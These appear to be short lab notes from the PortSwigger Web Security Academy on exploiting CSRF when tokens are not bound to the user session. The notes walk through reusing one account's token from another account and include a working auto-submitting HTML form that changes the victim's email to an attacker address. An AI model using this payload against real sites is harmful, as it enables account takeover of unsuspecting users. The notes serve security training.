CSRF where token is not tied to user session:
    -Logged in as wiener and obtained the POST /my-account/change-email request to obtain a valid CSRF token
    -Logged in as carlos in a incognito window to use the token genreated for wiener while while logged in as carlos. 
    -And it is accepted so it is not tied to user session.
    -Create a html code form that submits POST request to change the email
    -<form method="POST" action="https://0a7e0006034b37b0818f24f5019600de.web-security-academy.net/my-account/change-email">
        <input type="hidden" name="email" value="pwned@evil.com">
        <input type="hidden" name="csrf" value="(tokens)">
    </form>
    <script>
        document.forms[0].submit();
    </script>
    